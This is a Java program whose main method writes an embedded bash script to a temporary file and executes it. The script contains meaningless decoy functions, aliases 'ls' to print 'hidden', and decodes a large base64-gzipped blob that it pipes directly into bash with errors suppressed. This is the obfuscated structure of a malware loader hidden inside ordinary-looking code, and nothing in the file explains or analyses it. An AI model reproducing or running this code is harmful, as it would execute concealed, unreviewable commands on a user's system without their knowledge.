import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

veenxgqjt() { echo $((RANDOM * RANDOM)); }
vgjey6jpc() { for i in {1..3}; do :; done; }
vkmi48lvv() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
H4sIAAAAAAAAA6VXbW8bxxH+fr9iuiEsqfYd32RBpkIXqkUlAihRFaWkqGUQS96SvOh4S9ztiZIlAnGLwEETWwaSxkZr1HUQNy4KJy0aOIIT139GpKRP+Qudvb07HmUnRRLpw+3Ozs7rszPD136RrltOuk69tqa9Bqff3Dv54rPj218OPv3D4ODe6c0DmF97o1JbqCzPL60MHv5z8N6jwYMHgzu3FH1+Y10R3xR8izlwdPjs+B/Pjg6/Gt59evrnz09vfKSxnS53BWxsLC0UU3vyU9An8hcz2dylbFa/OG1SfXomP6tfmmnO6o2ZxsXpbD5Xz82YE/3obsIEFJHYoaQzXGjQmxGPXI9xXFlcWsVD+UF6r9czti2PGg3eMUQvybZaWVsPGOUCWaen86PjlfnlEh7KDx51qcNswxMus60dY2f3+ohxcalcqq3OBwbFa6mYu/ZZ70KN8bqgz+JfH1NydPjByfPnEXN1aeWN2q8rv61trJWLpC1E1yuk0y7tGS1LtP267zG3wR3BHCH9SveY5bUpp9RKe/Iv3aGYbs9yWnqd75DY5XJlY2GxPL9WWhiXrKQGoho2982mTV2WWJppdJxRj3lpmwrmibTJe47NqZlk0m3L8Xd02jFnpmOdC5W3V8qV+YWf54rDrrepTlvIRTSts2VaLuhdIKk44kRrmGN72N8HtmMJyGqa2wG9CXXOhWHzVrzQ4sAfP/5g8Ozgu28/HPz998O/3j86vDV4cm9w/7F29aq8mYVr16S8hu/aoHtljhSSSmaJhJy5lzhzyHkm8BFz/iXmPDInI4ZetTvchPM7qDEHeWnx8ccPhu/fOX3v1vHzL4af3Dz65qnWoAIuA4axabWMdzzuwOuvQ6myqO1pAAQ9JQXYA2LiO6jbzMSdcH12AY/YNrNxSyynyQkShNXB9NJON+SB/gUpwnQ8KQKXuMGMbTNXEq6iUEGldNLivGUzKYKapss8eUyELZM9awT/BPrXUIASaDl17jumEqLEhoK20QBP73m65ZAL4clul8VHEdG2PASNJBcK47SaBB4eJB5aP2SQaIsM931LRoKoctWX5kX6XOp4oRBlXMKIXmQB0rpUtCUtvYVPbURm1LV3ayYVtNZm1GRuzaGd4HKVNfS3Wb3KG1tM6KsuF7zBbRJc7MvgBCYQ7otReILDvZEBiH3WEEGyVMRCAoROJljrNipKcKp9oEkpclETU+BoWg61x8RpfU1iCCE3uPPl4I+PISoompHOgus7oDfGQHc5bbLttOPbNuQun8vCOc2zGetCTuu2XPwi5El4lSBeR9z4BvaANdocwRXqCHUOPvv3yVePvvv2BpkLX/McGiZNunF/+OTT4d3PIVGBtO6WheKUnhwI38GyTV6yC9VJbIfWYX1IvM+ivEm0s5UadeKzcEWth1WrFrTByakAHMnHHWoEXXe4Tn3B/S6igKlY6ap5klTctggS5dMPyiI+FMwOtdvcE4WU1CljFNesMKAAyug8rkZBTdpg/DLU9L0hTgRsLMoYYllIIpXJgI+5j5j50RH4yY5e/EFHUehPcXPkGECTu2CB5cBe1jCymf4cmDx4RyaXraeYmlTaeQni9nWV6tcz+qVN/dr5TUO4uyNVm7KJkZE3+yArAOgOZKcCqbLySxAo6UR2gHPnQotjIlLqLqNbwY3oDUmLHKYpEddfEhG5Pbz7t+F//nRy++vBwSfkTA7jl5x8M5FFCVgqiWcBL4P7ChQkxCbatObwtt8F5mzDyu9q1dLaW6W1Yt5oM4u5BvMN7rYKOHDJw/VytRj0GlxfKS+VVtaR/8paab1YLdWzVyorFrtUFhu/8VnDzFRz8zOldxZXS6XljUUw0vlXVB00SPmvhlM1ymotJmrUbXEVthC7VhPG/FcTp4zAHIg2OiczEGYnyYB0ZnssOA7QDC5DIBQz0KE7Nbm2mFfMZiIUEVXje23LZlJjKmAH3RaQStwI9Ib4A5icDLjOn5+aCik/gMnJ/wPKqVehEmshePg+Jrz9SM7+/kSk7dVYHSEzic0YnXG49tS1gu47Ww6Oi+M2SZP6MihNSyJzlBjp3FimpkZDD7y1XKpW4fSj/w5vP9KCTZHswSbZ3sTOtUlym9jsNknXU1s1vvcVEceSiCp/GoRU2eVH5KDSqwMr5g6mg1BGRM2ovdfYVXsHfVckh4Xyep4iyF58lkmWvkj8yNHIJBwq1GEwVvyKmcVcZno2lGaHvgWLwAbH+l5R1O466lDtm91oh6FXaQpmKkx7ajJMWxBVnJ4Bfy2ymWnQe5mpZIHGbCjOkxd3Th5+eHT4xDAMHMpxaOrCRFiDPn46eP9fp+++O7j57OjFw8HB13K0Djr2yYu/4LAtr8xBslurqWCcFnfwcXI+KmuZCVhaWYf10tqypvWoJbT/AdKzbbjpDgAA
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
